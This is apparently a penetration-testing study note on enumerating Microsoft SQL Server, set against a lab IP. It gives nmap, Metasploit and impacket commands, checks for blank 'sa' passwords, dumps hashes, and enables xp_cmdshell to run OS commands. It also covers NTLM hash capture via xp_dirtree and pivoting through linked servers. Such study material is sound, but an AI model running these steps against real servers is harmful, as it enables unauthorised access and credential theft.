---
tags: [enumeration, enumeration/mssql]
module: footprinting
last_updated: 2026-05-10
source_count: 1
---

# MSSQL Enumeration

MSSQL enumeration: nmap scripts, Metasploit mssql_ping, impacket-mssqlclient, linked servers, and xp_cmdshell.

## Overview

Microsoft SQL Server (MSSQL) is Microsoft's enterprise RDBMS. It runs primarily on Windows and listens on **TCP port 1433** by default. It is tightly integrated with Windows authentication (Active Directory) but also supports SQL Server authentication.

From a pentester's perspective, MSSQL is interesting because:
- Default `sa` account may have a blank or weak password
- xp_cmdshell can execute OS commands if enabled
- Linked servers can pivot to other database instances
- NTLM hash capture is possible via certain MSSQL functions

## Key Concepts / Techniques

### Default System Databases

| Database | Purpose |
|----------|---------|
| `master` | System-wide SQL Server configuration |
| `model` | Template for new databases |
| `msdb` | SQL Server Agent jobs and alerts |
| `tempdb` | Temporary objects |
| `resource` | Read-only system objects |

### Authentication Modes

- **Windows Authentication**: Uses the Windows/AD login. Default; no separate SQL password needed.
- **SQL Server Authentication**: Separate SQL account with username/password. `sa` is the built-in SQL sysadmin account — if not disabled, check for blank or common passwords.

### Dangerous Configurations

- Clients connecting without encryption
- Self-signed certificates (can be spoofed for MITM)
- Named pipes enabled (lateral movement vector)
- Weak `sa` credentials
- xp_cmdshell enabled (OS command execution)

### xp_cmdshell

Extended stored procedure that runs OS commands as the SQL Server service account. Disabled by default in modern SQL Server but frequently enabled by administrators for "convenience." If sysadmin access is obtained, it can be enabled:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## Commands / Syntax

```bash
# Nmap comprehensive MSSQL scan
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,\
ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes \
--script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER \
-sV -p1433 10.129.201.248

# Metasploit mssql_ping — service discovery
msf6 > use auxiliary/scanner/mssql/mssql_ping
msf6 > set rhosts 10.129.201.248
msf6 > run

# Connect with impacket-mssqlclient (Windows auth)
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth

# Connect with SQL auth
impacket-mssqlclient sa@10.129.201.248

# Once connected — basic enumeration
SQL> select name from sys.databases          # List databases
SQL> use Employees                            # Switch database
SQL> select table_name from information_schema.tables where table_schema='dbo'
SQL> select * from users limit 10

# Enable xp_cmdshell
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami'
SQL> EXEC xp_cmdshell 'net user'

# Check for linked servers
SQL> select * from sys.servers where is_linked = 1
SQL> EXEC sp_linkedservers
```

## Flags & Options

### Nmap MSSQL Scripts

| Script | Description |
|--------|-------------|
| `ms-sql-info` | Instance name, version, hostname, named pipe |
| `ms-sql-empty-password` | Check for blank sa password |
| `ms-sql-ntlm-info` | Domain/hostname via NTLM negotiation |
| `ms-sql-config` | Read server configuration |
| `ms-sql-tables` | List tables |
| `ms-sql-hasdbaccess` | Check DB access for discovered users |
| `ms-sql-dump-hashes` | Dump password hashes |
| `ms-sql-xp-cmdshell` | Execute OS commands via xp_cmdshell |

### impacket-mssqlclient

| Flag | Description |
|------|-------------|
| `-windows-auth` | Use Windows authentication |
| `-port <N>` | Non-standard port |

## Gotchas & Notes

- **Named pipes** appear in nmap output as `\\HOST\pipe\sql\query`. Named pipes are an alternative connection path that may bypass firewall rules. Also useful for relay attacks.
- **NTLM hash capture**: Functions like `xp_dirtree` can force the MSSQL service account to authenticate to a controlled server, capturing the NTLM hash for cracking/relay.
- **DAC (Dedicated Admin Connection)**: Listed in nmap output as port 1434. Provides admin-only access when the server is overloaded. May bypass normal authentication restrictions.
- **Windows auth means AD auth**: If MSSQL uses Windows authentication, obtaining any domain user credentials that have DB access is sufficient for connection.
- **Password history**: The `sa` account is sometimes left enabled with the default blank password even on production servers — always check.
- **Linked server abuse**: If MSSQL has linked servers, you can execute queries on remote instances using `EXEC('query') AT [linked_server_name]` — powerful pivot mechanism.

## Related Pages

- [[enumeration/_overview]]
- [[tools/impacket]]
- [[tools/crackmapexec]]

## Sources

- raw/footprinting/host_based_enumeration_mssql.md
